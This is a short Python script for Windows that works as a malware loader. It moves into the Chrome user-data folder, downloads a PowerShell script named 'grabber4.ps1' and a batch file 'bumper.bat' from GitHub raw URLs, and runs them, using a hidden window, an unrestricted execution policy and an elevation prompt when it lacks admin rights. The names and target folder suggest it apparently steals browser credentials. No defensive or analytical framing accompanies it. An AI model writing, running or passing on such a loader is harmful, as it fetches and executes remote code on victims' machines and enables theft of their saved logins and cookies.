import os

from urllib import request

from os.path import exists

import time

import subprocess

import sys

import requests

import pythoncom

import pyuac

import tkinter as tk

from tkinter import simpledialog

import pywintypes

import win32api

from win32com.shell import shell

import subprocess

if shell.IsUserAnAdmin():
	
	print ('ok!')

	d = os.path.join(os.environ["HOMEPATH"], r"AppData\Local\Google\Chrome\User Data")

	os.chdir(d)

	remote_url = 'https://raw.githubusercontent.com/Mood56467/grabber3/main/grabber3'

	local_file = 'grabber4.ps1'

	request.urlretrieve(remote_url, local_file)

	time.sleep(2)

	p = subprocess.Popen('Powershell.exe -File grabber4.ps1')
	p.communicate()

else:
	d = os.path.join(os.environ["HOMEPATH"], r"AppData\Local\Google\Chrome\User Data")

	os.chdir(d)

	remote_url = 'https://raw.githubusercontent.com/Mood56467/bumper/main/bumper'

	local_file = 'bumper.bat'

	request.urlretrieve(remote_url, local_file)

	time.sleep(2)

	remote_url = 'https://raw.githubusercontent.com/Mood56467/grabber3/main/grabber3'

	local_file = 'grabber4.ps1'

	request.urlretrieve(remote_url, local_file)

	time.sleep(2)

	ROOT = tk.Tk()

	ROOT.withdraw()

	p = subprocess.Popen('cmd /c powershell.exe -executionpolicy unrestricted Start-Process -WindowStyle Hidden -File "bumper.bat" -Verb Runas', stdout=sys.stdout)
	p.communicate()
